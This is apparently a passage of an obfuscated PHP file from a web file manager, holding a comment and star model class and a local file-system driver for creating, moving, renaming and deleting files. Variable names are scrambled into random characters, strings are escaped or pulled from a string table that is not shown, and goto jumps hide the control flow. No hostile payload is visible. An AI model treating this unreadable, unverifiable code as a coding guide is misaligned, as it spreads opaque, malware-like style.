"\143\x6f\155\155\x65\156\164\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($†ãúÈŸ¯) { $≥·çÂË¡ =& $_SERVER[ˆë€Ï⁄∂]; if ($†ãúÈŸ¯[$≥·çÂË¡[2017]]) { $•ﬁ•±ˆÕ = $this->where(array($≥·çÂË¡[2018] => $†ãúÈŸ¯[$≥·çÂË¡[2017]]))->find(); if (!$•ﬁ•±ˆÕ || $•ﬁ•±ˆÕ[$≥·çÂË¡[200]] != $†ãúÈŸ¯[$≥·çÂË¡[200]] || $•ﬁ•±ˆÕ[$≥·çÂË¡[580]] != $†ãúÈŸ¯[$≥·çÂË¡[580]]) { return !1; } $this->where(array($≥·çÂË¡[2018] => $†ãúÈŸ¯[$≥·çÂË¡[2017]]))->setAdd($≥·çÂË¡[2019], 1); } $†ãúÈŸ¯[$≥·çÂË¡[2020]] = 0; $†ãúÈŸ¯[$≥·çÂË¡[2019]] = 0; $†ãúÈŸ¯[$≥·çÂË¡[841]] = 1; return $this->add($†ãúÈŸ¯); } public function commentCount($÷«“÷Å·, $√òÁÿ•ò, $ˆÊ‘ñ≠œ = false) { $É€Ãò‡ =& $_SERVER[ˆë€Ï⁄∂]; if (!$÷«“÷Å·) { return array(); } if (is_string($÷«“÷Å·) || is_int($÷«“÷Å·)) { $÷«“÷Å· = array($÷«“÷Å·); } $Œ‘‰àΩê = array($É€Ãò‡[580], $É€Ãò‡[2021] => $É€Ãò‡[576]); $§Ïß®èÁ = array($É€Ãò‡[580] => array($É€Ãò‡[7], $÷«“÷Å·), $É€Ãò‡[200] => $√òÁÿ•ò); if ($ˆÊ‘ñ≠œ) { $§Ïß®èÁ[$É€Ãò‡[1787]] = $ˆÊ‘ñ≠œ; } $Ô˛´ïÃí = $this->field($Œ‘‰àΩê)->where($§Ïß®èÁ)->group($É€Ãò‡[580])->select(); return array_to_keyvalue($Ô˛´ïÃí, $É€Ãò‡[580], $É€Ãò‡[576]); } public function starTarget($üØ™â÷”, $ÎÈª¨›¿) { $≤µ¨⁄€í =& $_SERVER[ˆë€Ï⁄∂]; $˘⁄õ˘óú = $üØ™â÷” + self::TYPE_STAR_OFFSET; $¸ß≥©≥ô = array($≤µ¨⁄€í[1787] => USER_ID, $≤µ¨⁄€í[200] => $˘⁄õ˘óú, $≤µ¨⁄€í[580] => $ÎÈª¨›¿); $”º‚‚à˛ = $this->where($¸ß≥©≥ô)->find(); if ($”º‚‚à˛) { return $this->where(array($≤µ¨⁄€í[486] => $”º‚‚à˛[$≤µ¨⁄€í[486]]))->delete(); } $õ”Åß†Í = array($≤µ¨⁄€í[2017] => 0, $≤µ¨⁄€í[1787] => USER_ID, $≤µ¨⁄€í[841] => 1, $≤µ¨⁄€í[181] => $≤µ¨⁄€í[12], $≤µ¨⁄€í[200] => $˘⁄õ˘óú, $≤µ¨⁄€í[580] => $ÎÈª¨›¿, $≤µ¨⁄€í[2020] => 0, $≤µ¨⁄€í[2019] => 0); return $this->add($õ”Åß†Í); } public function starTargetCount($¢ŒêÑ¬§, $ö÷›Ïãí) { $óÔ±õÓÓ =& $_SERVER[ˆë€Ï⁄∂]; $ÂòÓƒ¥Ï = $ö÷›Ïãí + self::TYPE_STAR_OFFSET; $Î‹˘≈ŒÙ = $this->commentCount($¢ŒêÑ¬§, $ÂòÓƒ¥Ï); $˝º˙Ÿ¶ = $this->commentCount($¢ŒêÑ¬§, $ÂòÓƒ¥Ï, USER_ID); return array($óÔ±õÓÓ[2022] => $Î‹˘≈ŒÙ, $óÔ±õÓÓ[2023] => $˝º˙Ÿ¶); } public function starTargetUserList($“€âıÿú, $Üñ«¶Îä) { $œÜ—Óüë =& $_SERVER[ˆë€Ï⁄∂]; $à√Ö±◊° = $“€âıÿú + self::TYPE_STAR_OFFSET; $î»’Öô” = array($œÜ—Óüë[580] => $Üñ«¶Îä, $œÜ—Óüë[200] => $à√Ö±◊°); $°ùïΩ∆˜ = $this->where($î»’Öô”)->count(); $°ïÂ∂˜˙ = array($œÜ—Óüë[343] => $°ùïΩ∆˜, $œÜ—Óüë[2024] => array()); if (!$°ùïΩ∆˜) { return $°ïÂ∂˜˙; } $’°åÉ≥È = $this->field($œÜ—Óüë[1787])->where($î»’Öô”)->limit(500)->select(); $’°åÉ≥È = array_to_keyvalue($’°åÉ≥È, $œÜ—Óüë[12], $œÜ—Óüë[1787]); $°ïÂ∂˜˙[$œÜ—Óüë[2024]] = Model($œÜ—Óüë[588])->userListInfo($’°åÉ≥È); return $°ïÂ∂˜˙; } public function prasiseUserList($¬ÍŸ‡’Ô) { $üÅŒ°ÔÀ =& $_SERVER[ˆë€Ï⁄∂]; $•í°ÕÙ = array($üÅŒ°ÔÀ[2025] => $¬ÍŸ‡’Ô); $Ê›ŸÆ¥“ = $this->where($•í°ÕÙ)->find(); $¡ª±î∂ö = _get($Ê›ŸÆ¥“, $üÅŒ°ÔÀ[2020], 0); $¶ù∞Çö± = array($üÅŒ°ÔÀ[343] => $¡ª±î∂ö, $üÅŒ°ÔÀ[2024] => array()); if (!$¡ª±î∂ö) { return $¶ù∞Çö±; } $©àòπÌÕ = Model($üÅŒ°ÔÀ[2026])->field($üÅŒ°ÔÀ[1787])->where($•í°ÕÙ)->limit(500)->select(); $©àòπÌÕ = array_to_keyvalue($©àòπÌÕ, $üÅŒ°ÔÀ[12], $üÅŒ°ÔÀ[1787]); $¶ù∞Çö±[$üÅŒ°ÔÀ[2024]] = Model($üÅŒ°ÔÀ[588])->userListInfo($©àòπÌÕ); return $¶ù∞Çö±; } public function remove($Ô’Ë±ïº) { $‡˝¬Æπ¿ =& $_SERVER[ˆë€Ï⁄∂]; $µŸ∑ÎÀ¿ = array($‡˝¬Æπ¿[2018] => $Ô’Ë±ïº); $÷Çﬁ®»§ = $this->where($µŸ∑ÎÀ¿)->find(); if ($÷Çﬁ®»§[$‡˝¬Æπ¿[2017]]) { $this->where(array($‡˝¬Æπ¿[2018] => $÷Çﬁ®»§[$‡˝¬Æπ¿[2017]]))->setAdd($‡˝¬Æπ¿[2019], -1); } return $this->where($µŸ∑ÎÀ¿)->delete(); } public function edit($ñªï≤à, $»‘∏ë·ø) { $ôÏç˜Ôô =& $_SERVER[ˆë€Ï⁄∂]; $¯ìÌØÀ◊ = array($ôÏç˜Ôô[2018] => $ñªï≤à); return $this->where($¯ìÌØÀ◊)->save(array($ôÏç˜Ôô[2027] => $»‘∏ë·ø)); } public function prasise($Â£®ª±œ) { $◊Ò®›“˛ =& $_SERVER[ˆë€Ï⁄∂]; $ÙÜû‚¡Ë = Model($◊Ò®›“˛[2028]); $œê˜ïÛÏ = array($◊Ò®›“˛[2018] => $Â£®ª±œ, $◊Ò®›“˛[1778] => USER_ID); $—™ÿ≈º¸ = $ÙÜû‚¡Ë->where($œê˜ïÛÏ)->find(); if (!$—™ÿ≈º¸) { $ÙÜû‚¡Ë->add($œê˜ïÛÏ); $›∞â¸∫‹ = $this->where(array($◊Ò®›“˛[2018] => $Â£®ª±œ))->setAdd($◊Ò®›“˛[2020], 1); } else { $ÙÜû‚¡Ë->where($œê˜ïÛÏ)->delete(); $›∞â¸∫‹ = $this->where(array($◊Ò®›“˛[2018] => $Â£®ª±œ))->setAdd($◊Ò®›“˛[2020], -1); } return $›∞â¸∫‹; } public function targetInfo($√Ö◊˛˚˜, $ﬁ≥Ÿ≥Ç) { $ú∞öÿÕ∞ =& $_SERVER[ˆë€Ï⁄∂]; $Ù»€Æ€∏ = array($ú∞öÿÕ∞[662] => $√Ö◊˛˚˜, $ú∞öÿÕ∞[663] => $ﬁ≥Ÿ≥Ç); $û≥£Å—“ = $this->where($Ù»€Æ€∏)->count(); $ÇÍöõå∆ = "\x52\111\107\110\x54\40\112\x4f\111\116\40{$this->tablePrefix}\x63\x6f\x6d\x6d\145\x6e\164\137\x70\x72\x61\x69\163\x65\x20\163\164\141\x72\x20\157\x6e\x20\x63\x6f\x6d\x6d\x65\x6e\164\56\143\x6f\x6d\155\145\x6e\164\x49\x44\40\x3d\40\x73\x74\141\x72\56\143\157\155\x6d\x65\156\164\x49\x44"; $¸àí∑Èî = $this->alias($ú∞öÿÕ∞[440])->where($Ù»€Æ€∏)->join($ÇÍöõå∆, $ú∞öÿÕ∞[2029])->count(); $π„ÃŸÙ’ = array($ú∞öÿÕ∞[2030] => $û≥£Å—“, $ú∞öÿÕ∞[2031] => $¸àí∑Èî); return $π„ÃŸÙ’; } public function listData($ü≈Ò⁄À›) { $˝∂ÑÇ˝« =& $_SERVER[ˆë€Ï⁄∂]; if (isset($ü≈Ò⁄À›[$˝∂ÑÇ˝«[2032]])) { if ($ü≈Ò⁄À›[$˝∂ÑÇ˝«[2032]]) { $ü≈Ò⁄À›[$˝∂ÑÇ˝«[2025]] = array($˝∂ÑÇ˝«[1106], intval($ü≈Ò⁄À›[$˝∂ÑÇ˝«[2032]])); } unset($ü≈Ò⁄À›[$˝∂ÑÇ˝«[2032]]); } if (isset($ü≈Ò⁄À›[$˝∂ÑÇ˝«[2033]])) { if ($ü≈Ò⁄À›[$˝∂ÑÇ˝«[2033]]) { $ü≈Ò⁄À›[$˝∂ÑÇ˝«[2025]] = array($˝∂ÑÇ˝«[1103], intval($ü≈Ò⁄À›[$˝∂ÑÇ˝«[2033]])); } unset($ü≈Ò⁄À›[$˝∂ÑÇ˝«[2033]]); } return $this->_listData($ü≈Ò⁄À›); } private function _listData($¶∂ıèÚÇ) { $´üóº„« =& $_SERVER[ˆë€Ï⁄∂]; $ûŸË—ÿî = $this->where($¶∂ıèÚÇ)->_makeOrder()->selectPage(100); $this->_listAppendParent($ûŸË—ÿî[$´üóº„«[456]]); $this->_listAppendUser($ûŸË—ÿî[$´üóº„«[456]]); $this->_listAppendMeta($ûŸË—ÿî[$´üóº„«[456]]); return $ûŸË—ÿî; } private function _makeOrder() { $¶ú¿ãŸ≠ =& $_SERVER[ˆë€Ï⁄∂]; $Œ∆˚∞ŸÇ = array($¶ú¿ãŸ≠[2020], $¶ú¿ãŸ≠[2019], $¶ú¿ãŸ≠[243]); $Ñ¸Ó∞∞Ç = Input::get($¶ú¿ãŸ≠[541], $¶ú¿ãŸ≠[7], $¶ú¿ãŸ≠[508], $Œ∆˚∞ŸÇ); $ëûƒ≥€¿ = Input::get($¶ú¿ãŸ≠[542], $¶ú¿ãŸ≠[7], $¶ú¿ãŸ≠[1780], array($¶ú¿ãŸ≠[2034], $¶ú¿ãŸ≠[537])); $•ì· —é = $Ñ¸Ó∞∞Ç . $¶ú¿ãŸ≠[53] . $ëûƒ≥€¿; return $this->order($•ì· —é); } private function _listAppendParent(&$÷Òﬂ†ÇÆ) { $éÂ≥¯áá =& $_SERVER[ˆë€Ï⁄∂]; $πªê˝ÍÙ = array_unique(array_to_keyvalue($÷Òﬂ†ÇÆ, $éÂ≥¯áá[12], $éÂ≥¯áá[2017])); $πªê˝ÍÙ = array_remove_value($πªê˝ÍÙ, $éÂ≥¯áá[240]); if (!$πªê˝ÍÙ) { return; } $≥Ãï˝à = $this->where(array($éÂ≥¯áá[2018] => array($éÂ≥¯áá[7], $πªê˝ÍÙ)))->select(); $≥Ãï˝à = array_to_keyvalue($≥Ãï˝à, $éÂ≥¯áá[2025]); foreach ($÷Òﬂ†ÇÆ as &$˝ÎìÛ√‚) { if (isset($≥Ãï˝à[$˝ÎìÛ√‚[$éÂ≥¯áá[2017]]])) { $˝ÎìÛ√‚[$éÂ≥¯áá[2035]] = $≥Ãï˝à[$˝ÎìÛ√‚[$éÂ≥¯áá[2017]]]; } } unset($˝ÎìÛ√‚); } private function _listAppendUser(&$ª˜‰Ω£˚) { $ŸÏ‚çÂ˝ =& $_SERVER[ˆë€Ï⁄∂]; $˛…¶»ﬂ≠ = array_unique(array_to_keyvalue($ª˜‰Ω£˚, $ŸÏ‚çÂ˝[12], $ŸÏ‚çÂ˝[1787])); $˛…¶»ﬂ≠ = array_remove_value($˛…¶»ﬂ≠, $ŸÏ‚çÂ˝[240]); if (count($˛…¶»ﬂ≠) == 0) { return; } foreach ($ª˜‰Ω£˚ as $Õåµƒ‚) { if (isset($Õåµƒ‚[$ŸÏ‚çÂ˝[2035]])) { $˛…¶»ﬂ≠[] = $Õåµƒ‚[$ŸÏ‚çÂ˝[2035]][$ŸÏ‚çÂ˝[1787]]; } } $ó¯ΩÍΩ = Model($ŸÏ‚çÂ˝[608])->userListInfo($˛…¶»ﬂ≠); foreach ($ª˜‰Ω£˚ as &$Õåµƒ‚) { $Õåµƒ‚[$ŸÏ‚çÂ˝[676]] = $ó¯ΩÍΩ[$Õåµƒ‚[$ŸÏ‚çÂ˝[1787]]]; if (isset($Õåµƒ‚[$ŸÏ‚çÂ˝[2035]])) { $Õåµƒ‚[$ŸÏ‚çÂ˝[2035]][$ŸÏ‚çÂ˝[676]] = $ó¯ΩÍΩ[$Õåµƒ‚[$ŸÏ‚çÂ˝[2035]][$ŸÏ‚çÂ˝[1787]]]; } } unset($Õåµƒ‚); } private function _listAppendMeta(&$˜Îπ±∞Ã) { $¶÷ôÚÌ =& $_SERVER[ˆë€Ï⁄∂]; $â¿µ§¿Ù = array_unique(array_to_keyvalue($˜Îπ±∞Ã, $¶÷ôÚÌ[12], $¶÷ôÚÌ[2025])); $â¿µ§¿Ù = array_remove_value($â¿µ§¿Ù, $¶÷ôÚÌ[240]); if (!$â¿µ§¿Ù) { return; } foreach ($˜Îπ±∞Ã as $ìﬁ‹›¶“) { if (isset($ìﬁ‹›¶“[$¶÷ôÚÌ[2035]])) { $â¿µ§¿Ù[] = $ìﬁ‹›¶“[$¶÷ôÚÌ[2035]][$¶÷ôÚÌ[2025]]; } } $Å§¿«âÎ = $this->metaList($â¿µ§¿Ù); if (!$Å§¿«âÎ) { return !1; } foreach ($˜Îπ±∞Ã as &$ìﬁ‹›¶“) { $ìﬁ‹›¶“[$¶÷ôÚÌ[550]] = $Å§¿«âÎ[$ìﬁ‹›¶“[$¶÷ôÚÌ[2025]]]; if (isset($ìﬁ‹›¶“[$¶÷ôÚÌ[2035]])) { $ìﬁ‹›¶“[$¶÷ôÚÌ[2035]][$¶÷ôÚÌ[550]] = $Å§¿«âÎ[$ìﬁ‹›¶“[$¶÷ôÚÌ[2035]][$¶÷ôÚÌ[2025]]]; } } unset($ìﬁ‹›¶“); } private function metaList($ùƒ´ﬂ˘Ø) { $ª’Üâﬁ =& $_SERVER[ˆë€Ï⁄∂]; if (!$ùƒ´ﬂ˘Ø) { return array(); } $∫ÔÖÕ„¿ = array($ª’Üâﬁ[2025] => array($ª’Üâﬁ[7], $ùƒ´ﬂ˘Ø)); $≤ã¥ä∫˝ = Model($ª’Üâﬁ[2036])->where($∫ÔÖÕ„¿)->select(); $≤ã¥ä∫˝ = array_to_keyvalue_group($≤ã¥ä∫˝, $ª’Üâﬁ[2025]); foreach ($≤ã¥ä∫˝ as $¡ÑÍ¿πê => $˘‚∆ˆº) { $˝ÚáºøØ = array(); foreach ($˘‚∆ˆº as $ïÏÖ≈ÂØ) { $˝ÚáºøØ[$ïÏÖ≈ÂØ[$ª’Üâﬁ[107]]] = $ïÏÖ≈ÂØ[$ª’Üâﬁ[461]]; } $≤ã¥ä∫˝[$¡ÑÍ¿πê] = $˝ÚáºøØ; } return $≤ã¥ä∫˝ ? $≤ã¥ä∫˝ : array(); } public function removeTarget($¨Öí«í£, $‘ı◊øú·) { $Ê≤¸¥ÌÂ =& $_SERVER[ˆë€Ï⁄∂]; if (!$‘ı◊øú·) { return !0; } $‘ı◊øú· = is_array($‘ı◊øú·) ? $‘ı◊øú· : array($‘ı◊øú·); $∞œë¬ÿÿ = array($Ê≤¸¥ÌÂ[200] => $¨Öí«í£, $Ê≤¸¥ÌÂ[580] => array($Ê≤¸¥ÌÂ[7], $‘ı◊øú·)); $åﬂŒ¬÷´ = $this->field($Ê≤¸¥ÌÂ[2025])->where($∞œë¬ÿÿ)->select(); $ÊÙ≤ÙèÛ = array_to_keyvalue($åﬂŒ¬÷´, $Ê≤¸¥ÌÂ[12], $Ê≤¸¥ÌÂ[2025]); if (!$ÊÙ≤ÙèÛ) { return !0; } $∞œë¬ÿÿ = array($Ê≤¸¥ÌÂ[2025] => array($Ê≤¸¥ÌÂ[7], $ÊÙ≤ÙèÛ)); $this->where($∞œë¬ÿÿ)->delete(); Model($Ê≤¸¥ÌÂ[2028])->where($∞œë¬ÿÿ)->delete(); Model($Ê≤¸¥ÌÂ[2037])->where($∞œë¬ÿÿ)->delete(); } } goto B∆•”ñ¡í; C©⁄¡±ñŒá: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($Ó∂‘Å¬∫) { if (substr($Ó∂‘Å¬∫, 0, 2) == $_SERVER[ˆë€Ï⁄∂][1426]) { $Ó∂‘Å¬∫ = BASIC_PATH . substr($Ó∂‘Å¬∫, 2); } return $Ó∂‘Å¬∫; } public function iconvApp($âÇ√§Èµ) { $Ω¶˙€œî =& $_SERVER[ˆë€Ï⁄∂]; global $config; return $this->iconvTo($âÇ√§Èµ, $config[$Ω¶˙€œî[1455]], $config[$Ω¶˙€œî[1454]]); } public function iconvSystem($çÀ¶ºº›) { $ììî”¥¶ =& $_SERVER[ˆë€Ï⁄∂]; global $config; return $this->iconvTo($çÀ¶ºº›, $config[$ììî”¥¶[1454]], $config[$ììî”¥¶[1455]]); } public function getPathOuter($ãî£±éì) { $—‚î¬Ü =& $_SERVER[ˆë€Ï⁄∂]; $á⁄®Â€€ = $this->iconvApp($this->pathBase); $ãî£±éì = $this->iconvApp($ãî£±éì); if (substr($á⁄®Â€€, 0, 2) == $—‚î¬Ü[1426]) { $á⁄®Â€€ = BASIC_PATH . substr($á⁄®Â€€, 2); } if (substr($ãî£±éì, 0, 2) == $—‚î¬Ü[1426]) { $ãî£±éì = BASIC_PATH . substr($ãî£±éì, 2); } $á⁄®Â€€ = KodIO::clear($á⁄®Â€€); $ãî£±éì = KodIO::clear($ãî£±éì); $ãî£±éì = substr($ãî£±éì, strlen($á⁄®Â€€)); if (empty($this->pathDriver)) { return $ãî£±éì; } return $this->pathDriver . $—‚î¬Ü[8] . ltrim($ãî£±éì, $—‚î¬Ü[8]); } public function mkfile($óñÁñ¸Ö, $≤Ë¸∑ä˙ = '', $ƒÔ“Ò˚Ü = REPEAT_RENAME) { $óñÁñ¸Ö = $this->iconvSystem($óñÁñ¸Ö); @touch($óñÁñ¸Ö); if ($≤Ë¸∑ä˙) { file_put_contents($óñÁñ¸Ö, $≤Ë¸∑ä˙); } @chmod($óñÁñ¸Ö, $this->pathAuth); if (is_file($óñÁñ¸Ö)) { return $this->getPathOuter($óñÁñ¸Ö); } $this->writeLog(__FUNCTION__ . $_SERVER[ˆë€Ï⁄∂][1466], !0); return !1; } public function mkdir($˝§ƒ›ü, $¶πÈãüÊ = REPEAT_SKIP) { $˝§ƒ›ü = $this->iconvSystem($˝§ƒ›ü); if (is_dir($˝§ƒ›ü)) { return $this->getPathOuter($˝§ƒ›ü); } @mkdir($˝§ƒ›ü, $this->pathAuth, !0); @chmod($˝§ƒ›ü, $this->pathAuth); if (is_dir($˝§ƒ›ü)) { return $this->getPathOuter($˝§ƒ›ü); } $this->writeLog(__FUNCTION__ . $_SERVER[ˆë€Ï⁄∂][1466], !0); return !1; } public function copyFile($‘ÖÇÚÙ˜, $™„Üõá–) { $this->mkdir($this->pathFather($™„Üõá–)); $‘ÖÇÚÙ˜ = $this->iconvSystem($‘ÖÇÚÙ˜); $™„Üõá– = $this->iconvSystem($™„Üõá–); $˙ıªëıú = copy_64($‘ÖÇÚÙ˜, $™„Üõá–); @chmod($™„Üõá–, $this->pathAuth); if ($˙ıªëıú) { return $this->getPathOuter($™„Üõá–); } $this->writeLog(__FUNCTION__ . $_SERVER[ˆë€Ï⁄∂][1466], !0); return !1; } public function moveFile($‰ø¶›ÀÙ, $∫≠ìÁ¨Ó) { $this->mkdir($this->pathFather($∫≠ìÁ¨Ó)); $‰ø¶›ÀÙ = $this->iconvSystem($‰ø¶›ÀÙ); $∫≠ìÁ¨Ó = $this->iconvSystem($∫≠ìÁ¨Ó); $ùﬂÜ⁄çÿ = intval(@rename($‰ø¶›ÀÙ, $∫≠ìÁ¨Ó)); if (!$ùﬂÜ⁄çÿ) { if ($ùﬂÜ⁄çÿ = intval(@copy_64($‰ø¶›ÀÙ, $∫≠ìÁ¨Ó))) { @unlink($‰ø¶›ÀÙ); } } @chmod($∫≠ìÁ¨Ó, $this->pathAuth); if ($ùﬂÜ⁄çÿ) { return $this->getPathOuter($∫≠ìÁ¨Ó); } $this->writeLog(__FUNCTION__ . $_SERVER[ˆë€Ï⁄∂][1466], !0); return !1; } public function movePath($§“π¸¨¬, $™°ú˚˛π, $•¢ª≈⁄” = false) { $îÃ€ã¿Ô =& $_SERVER[ˆë€Ï⁄∂]; $§“π¸¨¬ = $this->iconvSystem($§“π¸¨¬); $™°ú˚˛π = $this->iconvSystem($™°ú˚˛π); $Úº“ﬁ√« = rtrim($™°ú˚˛π, $îÃ€ã¿Ô[8]) . $îÃ€ã¿Ô[8] . ($•¢ª≈⁄” ? $•¢ª≈⁄” : get_path_this($§“π¸¨¬)); if (file_exists($Úº“ﬁ√«)) { return !1; } $ƒ¶≠Ωñ˙ = intval(@rename($§“π¸¨¬, $Úº“ﬁ√«)); $ƒ¶≠Ωñ˙ = file_exists($Úº“ﬁ√«); if ($ƒ¶≠Ωñ˙) { return $this->getPathOuter($Úº“ﬁ√«); } $this->writeLog(__FUNCTION__ . $îÃ€ã¿Ô[1466], !0); return !1; } public function delFile($ÓØö…Ø…) { $ÓØö…Ø… = $this->iconvSystem($ÓØö…Ø…); if (!@unlink($ÓØö…Ø…)) { @chmod($ÓØö…Ø…, $this->pathAuth); if (@unlink($ÓØö…Ø…)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[ˆë€Ï⁄∂][1466], !0); return !1; } return !0; } public function delFolder($ÂÒ§æ‹‚) { $óÅπ‹ãÂ =& $_SERVER[ˆë€Ï⁄∂]; $ÂÒ§æ‹‚ = $this->iconvSystem($ÂÒ§æ‹‚); if (!is_dir($ÂÒ§æ‹‚)) { return !0; } if (!($™∏ıäà¢ = opendir($ÂÒ§æ‹‚))) { return !1; } while (($˛„Öó©† = readdir($™∏ıäà¢)) !== !1) { if ($˛„Öó©† == $óÅπ‹ãÂ[10] || $˛„Öó©† == $óÅπ‹ãÂ[1378]) { continue; } $Ü∫∆´€  = $ÂÒ§æ‹‚ . $óÅπ‹ãÂ[8] . $˛„Öó©†; if (is_file($Ü∫∆´€ ) || is_link($Ü∫∆´€ )) { if (!unlink($Ü∫∆´€ )) { chmod($Ü∫∆´€ , $this->pathAuth); if (!unlink($Ü∫∆´€ )) { return !1; } } } else { if (is_dir($Ü∫∆´€ )) { chmod($Ü∫∆´€ , $this->pathAuth); $Ü∫∆´€  = $this->iconvApp($Ü∫∆´€ ); if (!$this->delFolder($Ü∫∆´€ )) { return !1; } } } } closedir($™∏ıäà¢); return rmdir($ÂÒ§æ‹‚); } public function rename($éπ‚”ÄÛ, $Æ¿•ìóÌ) { $±¡Ø®Ì˛ =& $_SERVER[ˆë€Ï⁄∂]; $÷˜á—íÛ = $this->fileNameAuto($this->pathFather($éπ‚”ÄÛ), $Æ¿•ìóÌ); $÷˜á—íÛ = $this->iconvSystem($÷˜á—íÛ); $éπ‚”ÄÛ = $this->iconvSystem($éπ‚”ÄÛ); $üﬁÕãÑˆ = $this->pathFather($éπ‚”ÄÛ); $⁄¡¬Ùü˚ = rtrim($üﬁÕãÑˆ, $±¡Ø®Ì˛[8]) . $±¡Ø®Ì˛[8] . $÷˜á—íÛ; $¿Ë‰è√’ = @rename($éπ‚”ÄÛ, $⁄¡¬Ùü˚); $⁄¡¬Ùü˚ = $this->iconvApp($⁄¡¬Ùü˚); if ($¿Ë‰è√’) { return $this->getPathOuter($⁄¡¬Ùü˚); } $this->writeLog(__FUNCTION__ . $±¡Ø®Ì˛[1466], !0); return !1; } public function size($øıËúÇ√) { $øıËúÇ√ = $this->iconvSystem($øıËúÇ√); return filesize_64($øıËúÇ√); } public function info($¡∑îí ú) { $¡∑îí ú = $this->iconvSystem($¡∑îí ú); if ($this->isFolder($¡∑îí ú)) { return $this->folderInfo($¡∑îí ú); } else { if ($this->isFile($¡∑îí ú)) { return $this->fileInfo($¡∑îí ú); } } return !1; } protected function infoChildren($√óﬁπ¯ê, &$·ê¸™Ì≈, $Ô˜‰äì≥ = true) { $Ãπƒ√±Ö =& $_SERVER[ˆë€Ï⁄∂]; check_abort_echo(); $√óﬁπ¯ê = rtrim($√óﬁπ¯ê, $Ãπƒ√±Ö[8]) . $Ãπƒ√±Ö[8]; if ($Ô˜‰äì≥) { $√óﬁπ¯ê = $this->iconvSystem($√óﬁπ¯ê); } if (!($€ãÂΩÏ÷ = @opendir($√óﬁπ¯ê))) { return; } while (($’ÓØÈÕ£ = readdir($€ãÂΩÏ÷)) !== !1) { if ($’ÓØÈÕ£ == $Ãπƒ√±Ö[10] || $’ÓØÈÕ£ == $Ãπƒ√±Ö[1378]) { continue; } $Àœ‘âª¸ = $√óﬁπ¯ê . $’ÓØÈÕ£; if (is_file($Àœ‘âª¸) || is_link($Àœ‘âª¸)) { $·ê¸™Ì≈[$Ãπƒ√±Ö[90]]++; $·ê¸™Ì≈[$Ãπƒ√±Ö[89]] += filesize_64($Àœ‘âª¸); } else { if (is_dir($Àœ‘âª¸)) { $·ê¸™Ì≈[$Ãπƒ√±Ö[91]]++; $this->infoChildren($Àœ‘âª¸, $·ê¸™Ì≈, !1); } } } closedir($€ãÂΩÏ÷); } private function folderInfo($¡™çú–Ö, $≠‹ ª˘î = false) { $˚àÒ¨ÕÄ =& $_SERVER[ˆë€Ï⁄∂]; $¡™çú–Ö = rtrim($¡™çú–Ö, $˚àÒ¨ÕÄ[8]) . $˚àÒ¨ÕÄ[8]; $·“Œµ‡ = $this->iconvApp($this->pathThis($¡™çú–Ö)); if ($≠‹ ª˘î) { return array($˚àÒ¨ÕÄ[32] => $·“Œµ‡, $˚àÒ¨ÕÄ[97] => $this->getPathOuter($¡™çú–Ö), $˚àÒ¨ÕÄ[33] => $˚àÒ¨ÕÄ[88]); } $Ï‘èﬁûﬁ = array($˚àÒ¨ÕÄ[32] => $·“Œµ‡, $˚àÒ¨ÕÄ[97] => $this->getPathOuter($¡™çú–Ö), $˚àÒ¨ÕÄ[33] => $˚àÒ¨ÕÄ[88], $˚àÒ¨ÕÄ[243] => @filectime($¡™çú–Ö), $˚àÒ¨ÕÄ[98] => @filemtime($¡™çú–Ö), $˚àÒ¨ÕÄ[1470] => @fileatime($¡™çú–Ö), $˚àÒ¨ÕÄ[1471] => is_readable($¡™çú–Ö), $˚àÒ¨ÕÄ[1472] => is_writable($¡™çú–Ö), $˚àÒ¨ÕÄ[1473] => get_mode($¡™çú–Ö)); return $Ï‘èﬁûﬁ; } private function fileInfo($°ä∏é»œ, $≥˜ÖáÓŸ = false) { $ù”Ω‘ûû =& $_SERVER[ˆë€Ï⁄∂]; $±ëÅéﬁ» = $this->iconvApp($this->pathThis($°ä∏é»œ)); if ($≥˜ÖáÓŸ) { return array($ù”Ω‘ûû[32] => $±ëÅéﬁ», $ù”Ω‘ûû[97] => $this->getPathOuter($°ä∏é»œ), $ù”Ω‘ûû[33] => $ù”Ω‘ûû[242], $ù”Ω‘ûû[89] => $this->size($°ä∏é»œ), $ù”Ω‘ûû[179] => $this->ext($±ëÅéﬁ»)); } $¯î≠÷»É = array($ù”Ω‘ûû[32] => $±ëÅéﬁ», $ù”Ω‘ûû[97] => $this->getPathOuter($°ä∏é»œ), $ù”Ω‘ûû[33] => $ù”Ω‘ûû[242], $ù”Ω‘ûû[243] => @filectime($°ä∏é»œ), $ù”Ω‘ûû[98] => @filemtime($°ä∏é»œ), $ù”Ω‘ûû[1470] => @fileatime($°ä∏é»œ), $ù”Ω‘ûû[89] => $this->size($°ä∏é»œ), $ù”Ω‘ûû[179] => $this->ext($±ëÅéﬁ»), $ù”Ω‘ûû[1471] => is_readable($°ä∏é»œ), $ù”Ω‘ûû[1472] => is_writable($°ä∏é»œ), $ù”Ω‘ûû[1473] => get_mode($°ä∏é»œ)); return $¯î≠÷»É; } public function exist($ÌÏ€ﬁƒÒ) { $ÌÏ€ﬁƒÒ = $this->iconvSystem($ÌÏ€ﬁƒÒ); return @file_exists($ÌÏ€ﬁƒÒ); } public function isFile($óê¸”Àù) { $óê¸”Àù = $this->iconvSystem($óê¸”Àù); return @is_file($óê¸”Àù); } public function isFolder($çÿÛøê®) { $çÿÛøê® = $this->iconvSystem($çÿÛøê®); return @is_dir($çÿÛøê®); } public function listPath($µÒ›™‰¨, $ßÌø» ¡ = false) { $Ïÿô»ûÈ =& $_SERVER[ˆë€Ï⁄∂]; $µÒ›™‰¨ = $this->iconvSystem($µÒ›™‰¨); $µÒ›™‰¨ = rtrim($µÒ›™‰¨, $Ïÿô»ûÈ[8]) . $Ïÿô»ûÈ[8]; $ÂŒ·ÔÚ‹ = array($Ïÿô»ûÈ[95] => array(), $Ïÿô»ûÈ[96] => array()); if (!($∂–¸ñö’ = @opendir($µÒ›™‰¨))) { return $ÂŒ·ÔÚ‹; } while (($Êÿ£¯–Á = readdir($∂–¸ñö’)) !== !1) { if ($Êÿ£¯–Á == $Ïÿô»ûÈ[10] || $Êÿ£¯–Á 